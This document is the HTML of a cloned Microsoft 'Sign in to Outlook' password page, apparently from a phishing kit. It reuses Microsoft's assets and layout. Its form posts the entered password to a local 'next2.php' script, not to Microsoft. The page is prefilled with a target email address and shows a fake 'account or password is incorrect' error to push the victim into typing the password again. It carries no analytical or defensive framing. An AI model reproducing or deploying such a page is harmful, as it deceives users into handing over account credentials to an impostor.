<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to Outlook</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <link rel="preconnect" href="https://aadcdn.msftauth.net" crossorigin="">
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="//aadcdn.msftauth.net">
<link rel="dns-prefetch" href="//aadcdn.msauth.net">

    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">


        <meta name="format-detection" content="telephone=no">

    <noscript>
        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
    </noscript>

    
    
<meta name="robots" content="none">




        <link rel="prefetch" href="https://login.live.com/Me.htm?v=3">
        <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">

    <script type="text/javascript">
        ServerData = $Config;
    </script>


    
    <link data-loader="cdn" crossorigin="anonymous" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_8owwt4u-33ps0wawi7tmow2.css" rel="stylesheet" onerror="$Loader.OnError(this)" onload="$Loader.OnSuccess(this)" integrity="sha384-Zc0p7pM8abcKGtPzWL0oscmmWxZhkOyRDsEZ+5f7A2srGIDp1BgnRxrdZkp9PeR5">



    <script data-loader="cdn" crossorigin="anonymous" src="https://aadcdn.msftauth.net/shared/1.0/content/js/ConvergedLogin_PCore_hMQIa-8TI8qqxRQ695cd-g2.js" onerror="$Loader.OnError(this)" onload="$Loader.OnSuccess(this)"></script>


    <script data-loader="cdn" crossorigin="anonymous" src="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_ywec5xsvivopphf4olex_a2.js" onerror="$Loader.OnError(this)" onload="$Loader.OnSuccess(this)" integrity="sha384-nPJEY0XfmPFijBq3WAybtPDDVNzad54Vvg/PuDs3o+cpu6o8ss5l5aCYN1HTCzXW"></script>

    


<script charset="utf-8" src="https://aadcdn.msftauth.net/shared/1.0/content/js/oneDs_8363475333f6d315e7ae.js"></script><link rel="prefetch" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_8owwt4u-33ps0wawi7tmow2.css"><link rel="prefetch" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_ywec5xsvivopphf4olex_a2.js"><script charset="utf-8" src="https://aadcdn.msftauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_ppassword_d4aa6f34855682e39ee8.js"></script><script charset="utf-8" src="https://aadcdn.msftauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_pcustomizationloader_8dc1586f19519d6b618f.js"></script></head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
    <script type="text/javascript">//<![CDATA[
!function(){var e=window,o=e.document,i=e.$Config||{};if(e.self===e.top){o&&o.body&&(o.body.style.display="block")}else if(!i.allowFrame){var s=e.self.location.href,l=s.indexOf("#"),n=-1!==l,t=s.indexOf("?"),f=n?l:s.length,d=-1===t||n&&t>l?"?":"&";s=s.substr(0,f)+d+"iframe-request-id="+i.sessionId+s.substr(f),e.top.location=s}}();

//]]></script>
    <script type="text/javascript">
//<![CDATA[
(function () {
var $Prefetch={"rfPre":true,"delay":5000,"maxHistory":4,"maxAge":43200,"ageRes":1440,"name":"clrc","fetch":[{"path":"https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_8owwt4u-33ps0wawi7tmow2.css","hash":"+SjF/0ga","co":true,"rf":true},{"path":"https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_ywec5xsvivopphf4olex_a2.js","hash":"ZW6LgEq3","co":true,"rf":true}],"mode":5};
!function(e,t,n){function r(e){x.appendLog&&x.appendLog("Client Prefetch: "+e)}function i(){try{for(var e=t.cookie.split(";"),r=0;r<e.length;r++){var i=e[r];if(i){var o=i.indexOf("=");if(-1!==o){if(i.substr(0,o).trim()===n.name){var u=i.substr(o+1);return JSON.parse(c(u))}}}}}catch(e){}return{}}function o(e,t,n){return e.replace(t,n)}function c(e){return e=o(e,/%5c/g,"\\"),e=o(e,/%3e/g,">"),e=o(e,/%3d/g,"="),e=o(e,/%3c/g,"<"),e=o(e,/%3b/g,";"),e=o(e,/%3a/g,":"),e=o(e,/%2c/g,","),e=o(e,/%27/g,"'"),
e=o(e,/%22/g,'"'),e=o(e,/%20/g," "),e=o(e,/%25/g,"%")}function u(e){return e=o(e,/%/g,"%25"),e=o(e,/ /g,"%20"),e=o(e,/"/g,"%22"),e=o(e,/'/g,"%27"),e=o(e,/,/g,"%2c"),e=o(e,/:/g,"%3a"),e=o(e,/;/g,"%3b"),e=o(e,/</g,"%3c"),e=o(e,/=/g,"%3d"),e=o(e,/>/g,"%3e"),e=o(e,/\\/g,"%5c")}function f(e){var r=new Date;r.setTime(r.getTime()+C*H),t.cookie=n.name+"="+u(JSON.stringify(e))+";expires="+r.toUTCString()+";path=/; Secure; SameSite=None"}function a(e,t){if(e){if(e.indexOf){return e.indexOf(t)}
for(var n=0;n<e.length;n++){if(e[n]===t){return n}}}return-1}function h(e,t){return-1!==a(e,t)}function g(e,t){var n=a(e,t);return-1!==n&&(e.splice(n,1),!0)}function l(e,t){for(var n in e){if(e.hasOwnProperty(n)&&!t(n,e[n])){break}}}function s(){var e=(new Date).getTime(),t=D*H;return P.getTime()>e?Math.round(e/t):Math.round((e-P.getTime())/t)}function d(e,t){var n=!1;if(t&&t.length>0){n=!0;for(var r=0;r<t.length;r++){delete e[t[r]]}}return n}function p(e){var t=s()-C,n=t+2*C,r=null,i=0,o=[]
;return l(e,function(c){return c<t||c>n?o.push(c):(0===e[c].length?o.push(c):(null===r||c<r)&&(r=c),i++),!0}),null!==r&&i>k&&o.push(r),d(e,o)}function v(e,t,n){r("Fetched: "+e+" Hash: "+t+" isRefresh: "+n);var o=i(),c=s(),u=!1,a=!1;if(l(o,function(e,n){return!h(n,t)||(e!==c?g(o[e],t)&&(a=!0):u=!0,!1)}),!u){var d=o[c]||[];d.push(t),o[c]=d,a=!0}a|=p(o),a&&f(o),b()}function m(t,n,i,o){var c={"method":"GET"};i&&(c.mode="cors"),e.fetch(t,c).then(function(e){
200===e.status?v(t,n,o):(r("Unexpected response - "+e.status),b())}).then(null,function(e){r("Failed - "+e),b()})}function T(){if(e.XMLHttpRequest&&!J){return new XMLHttpRequest}if(e.ActiveXObject){try{return new ActiveXObject("Msxml2.XMLHTTP")}catch(e){}try{return new ActiveXObject("Microsoft.XMLHttp")}catch(e){}}return null}function w(e,t,n,i,o){r("Fetching - "+t),e.onload=function(){v(t,n,o)},e.onerror=function(){r("XHR failed!"),b()},e.ontimeout=function(){r("XHR timed out!"),b()};try{e.open("GET",t),
e.withCredentials=i&&!N,e.send()}catch(r){N?setTimeout(function(){v(t,n,o)},0):(N=!0,w(e,t,n,!1,o))}}function O(t,n,i,o){if(e.fetch){return void m(t,n,i,o)}var c=T();if(null!==c){return void w(c,t,n,i,o)}r("Unable to identify a transport option!")}function b(){var e=n.fetch;if(X<e.length&&e[X]){var t=e[X];O(t.path,t.hash,t.co||!1,t.rf||!1),X++}}function y(e){if(e){try{var n=t.createElement("link");n.rel="prefetch",n.href=e,t.head.appendChild(n)}catch(e){}}}function M(){r("Starting"),b(),b()}function S(){
for(var t=e.$Config||e.ServerData||{},r=n.fetch,i=n.mode||-1,o=-1,c=0;c<r.length;c++){0!==o&&i>=3&&(o=r[c].rf?1:0),R&&!J&&y(r[c].path||{})}t.prefetchPltMode=o}if(n&&n.fetch&&0!==n.fetch.length){var x=e.$Debug||{},X=0,H=6e4,P=new Date(2019),k=n.maxHistory||4,C=n.maxAge||20160,D=n.ageRes||1440,L=n.delay||5e3,R=n.rfPre||!1,J=void 0!==(e._phantom||e.callPhantom),N=!1;JSON&&JSON.parse&&(n.clearCookie=function(){document.cookie=n.name+"=; expires=Thu, 01 Jan 1970 00:00:01 GMT;"},e.$Do.when("doc.load",function(){
setTimeout(M,L),setTimeout(S,0)}))}}(window,document,$Prefetch);

;
})();
//]]>
</script>


<div><!--  -->

<!--  -->

<div data-bind="if: activeDialog"></div>

<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.fUseMinHeight }" action="next2.php" class="provide-min-height">
    <!-- ko withProperties: { '$loginPage': $data } -->
    <div class="login-paginated-page" data-bind="component: { name: 'master-page',
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!--  -->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko if: isLightboxTemplate() -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.fUseMinHeight }" class="provide-min-height"><!--  -->

<div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.fUseMinHeight },
    component: { name: 'background-image-control',
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }" class="provide-min-height"><div class="background-image-holder app" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl -->
    <div class="background-image-small" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/appbackgrounds/49-small_e58aafc980614a9cd7796bea7b5ea8f0.jpg&quot;);"></div>
    <!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div id="backgroundImage" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" class="background-image ext-background-image" style="background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/appbackgrounds/49_7916a894ebde7d29c2cc29b267f1299f.jpg&quot;);"></div>
        <!-- ko if: useImageMask --><!-- /ko -->
    <!-- /ko -->
</div></div>

<!-- ko if: svr.iBannerEnvironment --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer app" data-bind="css: { 'app': $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
            <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div class="flex-column">
    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder -->
    <div class="background-logo-holder">
        <img class="background-logo" role="presentation" data-bind="attr: { src: $page.backgroundLogoUrl }" src="https://aadcdn.msftauth.net/shared/1.0/content/images/applogos/53_8b36337037cff88c3df203bb73d58e41.png">
    </div>
    <!-- /ko -->

    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box app">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <!-- ko if: svr.fShowCookieBanner --><!-- /ko -->

        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <!-- ko if: loadBannerLogo -->
        <div data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: svr.strLWADisclaimerMsg && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->

        <!-- ko if: asyncInitReady -->
        <div role="main" data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.fEnableCssAnimation,
                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { 'zero-opacity': hidePaginatedView() }">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
    <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

        <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  -->

<div class="identityBanner">
    <!-- ko if: isBackButtonVisible -->
    <button type="button" class="backButton" data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
        <!-- ko ifnot: svr.fIsRTLMarket -->
            <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: svr.fIsRTLMarket --><!-- /ko -->
    </button>
    <!-- /ko -->

    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="lina.hö3mail@b.c">lina.hö3mail@b.c</div>
</div></div>
    </div>
    <!-- /ko -->

    <div class="pagination-view has-identity-banner" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    username: sharedData.username,
                    displayName: sharedData.displayName,
                    hipRequiredForUsername: sharedData.hipRequiredForUsername,
                    passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                    availableCreds: sharedData.availableCreds,
                    evictedCreds: sharedData.evictedCreds,
                    useEvictedCredentials: sharedData.useEvictedCredentials,
                    showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                    flowToken: sharedData.flowToken,
                    defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                    userTenantBranding: sharedData.userTenantBranding,
                    sessions: sharedData.sessions,
                    callMetadata: sharedData.callMetadata,
                    supportsNativeCredentialRecovery: sharedData.supportsNativeCredentialRecovery },
                event: {
                    restoreIsRecoveryAttemptPost: $loginPage.view_onRestoreIsRecoveryAttemptPost,
                    updateFlowToken: $loginPage.view_onUpdateFlowToken,
                    submitReady: $loginPage.view_onSubmitReady,
                    redirect: $loginPage.view_onRedirect,
                    resetPassword: $loginPage.passwordView_onResetPassword,
                    setBackButtonState: view_onSetIdentityBackButtonState,
                    setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  -->

<!--  -->

<div aria-hidden="true">
    <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
	<input type="hidden" name="login" data-bind="value: unsafe_username" value="lina.hö3mail@b.c">
    <input type="hidden" name="userid" value="lina.hö3mail@b.c">
    <!-- The loginfmt input type is different as some password managers require it to be of type text.
        Since screen readers might not hide this input, a parent div with aria-hidden true has been added. -->
    <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
    <input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11">
    <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
    <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
    <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
    <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
    <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
</div>

<div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
    <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
</div>

<!-- ko if: showCredViewBrandingDesc --><!-- /ko -->

<!-- ko if: unsafe_pageDescription --><!-- /ko -->

<div class="row">
    <div class="form-group col-md-24">
        <div role="alert" aria-live="assertive">
            <!-- ko if: passwordTextbox.error -->
            <div id="passwordError" data-bind="
                externalCss: { 'error': true },
                htmlWithBindings: passwordTextbox.error,
                childBindings: {
                    'idA_IL_ForgotPassword0': {
                        href: accessRecoveryLink || svr.urlResetPassword,
                        attr: {
                            target: accessRecoveryLink &amp;&amp; '_blank',
                            role: supportsNativeCredentialRecovery ? 'button' : 'link'
                        },
                        click: accessRecoveryLink ? null : resetPassword_onClick } }" class="error ext-error">Your account or password is incorrect. If you don't remember your password, <a id="idA_IL_ForgotPassword0" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAjZI9bNNQAIT94tT94a-ChW5VYQHxEjvPjuNISJS0Sho7JG7jJs5SOfZz4sbOSxw7aTKwoEqMFSMbLEjtBFOphGBD7UIRGxNiqlCREFMlFhqxMPbT6XTz3d2luRiXvs3-IwHHDlnb5qCJx-k__Oszs9XPczs39l49ieiRw9P38ttdsNAMgk4vHY-TMHAJacWIbTsmRkkhZhIvTgZGfB-AYwBOANiNiEmUYs_FJnkJpXghhVAMmywv2ZYNWVxnIS9iHkqCxUM-wSHBEhICMpJfI9eKi2HQTIyN-M4I_45M28T3NjqkFzyn98GSHkoZUhhkFx9uwqFoaZuwrIyWa53lYrOYbeRkcY0XNEmVm_r6mgRho96vK052OScXc8biylY-b5mqqraMrqDKBbE0UHNd1De1RqMiYy3TbWpYVoqlTGZo8C3NTQ1RGXr9tWHd05XVas1oNGGFV2oJpTWqNTKBX7ERK7obj4yOi7stt4RsFYdizZN4U1f0klXyUjbm1jd26QuV_4Zmzuv0SPuIZkgHtx3rO33Hdeo-sbCPTdfwDNMhbdzrO34QGu6DsG30DC-GrTDWwcdR8C0KfkQvs3R6ampmlrpJzVNnUfBy4nzTyXnM3nt8K783t_3s4yeOOpqIF6pIG-o4WUXldnaVW7Gt-lAbWaScc618YavPrlaUJU7Ly4PWfZTmdhiwwzAHzPQUPUst0JkSd8KAX0zk6SR1MH2BgxxfAh-uUGdX3704_PJn-_XP3F81&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10" role="link">reset it now.</a></div>
            <!-- /ko -->
        </div>

        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

            <input name="pass" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box has-error ext-has-error" aria-required="true" data-bind="
                textInput: passwordTextbox.value,
                ariaDescribedBy: [
                    'loginHeader passwordError',
                    showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
                    unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                moveOffScreen: showPassword,
                externalCss: {
                    'input': true,
                    'text-box': true,
                    'has-error': passwordTextbox.error }" aria-describedby="loginHeader passwordError  " placeholder="Password" aria-label="Enter the password for lina.hö3mail@b.c" tabindex="0">

            <!-- ko if: svr.fUsePasswordPeek && showPassword() --><!-- /ko -->
        <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>

        <!-- ko if: svr.fUsePasswordPeek --><!-- /ko -->
    </div>
</div>

<!-- ko if: shouldHipInit --><!-- /ko -->

<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="position-buttons password-reset-links-container ext-password-reset-links-container">
    <div>
        <!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko -->
        <!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko -->

        <div class="row">
            <div class="col-md-24">
                <div class="text-13">
                    <!-- ko if: svr.urlSkipZtd && svr.sZtdUpnHint --><!-- /ko -->
                    <!-- ko ifnot: hideForgotMyPassword -->
                    <div class="form-group">
                        <a id="idA_PWD_ForgotPassword" role="link" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAjZI9bNNQAIT94tT94a-ChW5VYQHxEjvPjuNISJS0Sho7JG7jJs5SOfZz4sbOSxw7aTKwoEqMFSMbLEjtBFOphGBD7UIRGxNiqlCREFMlFhqxMPbT6XTz3d2luRiXvs3-IwHHDlnb5qCJx-k__Oszs9XPczs39l49ieiRw9P38ttdsNAMgk4vHY-TMHAJacWIbTsmRkkhZhIvTgZGfB-AYwBOANiNiEmUYs_FJnkJpXghhVAMmywv2ZYNWVxnIS9iHkqCxUM-wSHBEhICMpJfI9eKi2HQTIyN-M4I_45M28T3NjqkFzyn98GSHkoZUhhkFx9uwqFoaZuwrIyWa53lYrOYbeRkcY0XNEmVm_r6mgRho96vK052OScXc8biylY-b5mqqraMrqDKBbE0UHNd1De1RqMiYy3TbWpYVoqlTGZo8C3NTQ1RGXr9tWHd05XVas1oNGGFV2oJpTWqNTKBX7ERK7obj4yOi7stt4RsFYdizZN4U1f0klXyUjbm1jd26QuV_4Zmzuv0SPuIZkgHtx3rO33Hdeo-sbCPTdfwDNMhbdzrO34QGu6DsG30DC-GrTDWwcdR8C0KfkQvs3R6ampmlrpJzVNnUfBy4nzTyXnM3nt8K783t_3s4yeOOpqIF6pIG-o4WUXldnaVW7Gt-lAbWaScc618YavPrlaUJU7Ly4PWfZTmdhiwwzAHzPQUPUst0JkSd8KAX0zk6SR1MH2BgxxfAh-uUGdX3704_PJn-_XP3F81&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10" data-bind="
                            text: unsafe_forgotPasswordText,
                            href: accessRecoveryLink || svr.urlResetPassword,
                            attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                            click: accessRecoveryLink ? null : resetPassword_onClick">Forgot my password</a>
                    </div>
                    <!-- /ko -->
                    <!-- ko if: allowPhoneDisambiguation --><!-- /ko -->
                    <!-- ko ifnot: useEvictedCredentials -->
                        <!-- ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                redirect: onRedirect,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  -->

<div class="form-group">
    <!-- ko if: showSwitchToCredPickerLink --><!-- /ko -->

    <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko -->

    <!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko -->
</div>

<!-- ko if: credLinkError --><!-- /ko --><!-- /ko -->

                        <!-- ko if: evictedCreds.length > 0 --><!-- /ko -->
                    <!-- /ko -->
                    <!-- ko if: showChangeUserLink --><!-- /ko -->
                </div>
            </div>
        </div>
    </div>

    <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
        <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
            <div data-bind="component: { name: 'footer-buttons-field',
                params: {
                    serverData: svr,
                    primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                    isPrimaryButtonEnabled: !isRequestPending(),
                    isPrimaryButtonVisible: svr.fShowButtons,
                    isSecondaryButtonEnabled: true,
                    isSecondaryButtonVisible: false },
                event: {
                    primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin },
    externalCss: { 'button-field-container': true }">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    'button': true,
                    'primary': true },
                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Sign in" data-report-attached="1">
    </div>
</div></div>
        </div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
</div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
